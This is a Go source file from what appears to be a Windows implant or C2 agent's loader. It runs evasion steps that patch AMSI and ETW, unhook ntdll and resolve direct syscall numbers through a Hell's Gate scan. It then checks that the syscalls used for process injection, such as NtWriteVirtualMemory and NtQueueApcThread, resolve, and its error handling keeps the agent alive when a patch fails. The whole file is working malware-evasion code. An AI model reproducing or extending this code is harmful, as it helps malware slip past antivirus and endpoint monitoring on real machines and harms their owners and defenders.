//go:build windows

package loader

import (
	"fmt"

	"github.com/user/wisp/agent/internal/win"
)

// applyEvasion runs the evasion pre-load steps and warms the SSN table. Every
// step is panic-protected so a bad patch can never take the agent down.
func applyEvasion() {
	run := []func() error{
		win.ResolveSSNsClean,
		win.PatchAMSI,
		win.PatchETWEx,
		win.UnhookNtdll,
	}
	for _, fn := range run {
		func() {
			defer func() { recover() }()
			_ = fn()
		}()
	}
}

// WarmSSNs resolves the syscall-number table and reports a diagnostic summary
// of the key NT APIs (used to verify the Hell's Gate scan on a real host).
func WarmSSNs() (string, error) {
	var out string
	func() {
		defer func() {
			if r := recover(); r != nil {
				out = fmt.Sprintf("SSN warm-up panic: %v", r)
			}
		}()
		win.EnsureSSNs()
		ntdll := win.ModuleNtdll()
		out += fmt.Sprintf("ntdll base=0x%x\n", ntdll)
		out += fmt.Sprintf("spoofed-stub available (L7)=%v\n", win.SpoofedAvailable())
		err := win.ResolveSSNs()
		out += fmt.Sprintf("ResolveSSNs err=%v\n", err)
		out += win.DumpExport("NtAllocateVirtualMemory", 48) + "\n"
		out += win.DiagSyscall()
		names := []struct {
			hash uint32
			name string
		}{
			{win.HashNtAllocateVirtualMemory, "NtAllocateVirtualMemory"},
			{win.HashNtProtectVirtualMemory, "NtProtectVirtualMemory"},
			{win.HashNtWriteVirtualMemory, "NtWriteVirtualMemory"},
			{win.HashNtQueueApcThread, "NtQueueApcThread"},
			{win.HashNtCreateThreadEx, "NtCreateThreadEx"},
		}
		for _, n := range names {
			if e, ok := win.SSN(n.hash); ok {
				out += fmt.Sprintf("%s SSN=0x%x gadget=%v\n", n.name, e.SSN, e.HasGadget())
			} else {
				out += fmt.Sprintf("%s MISSING\n", n.name)
			}
		}
	}()
	if out == "" {
		return "", fmt.Errorf("warm-up produced no output")
	}
	return out, nil
}
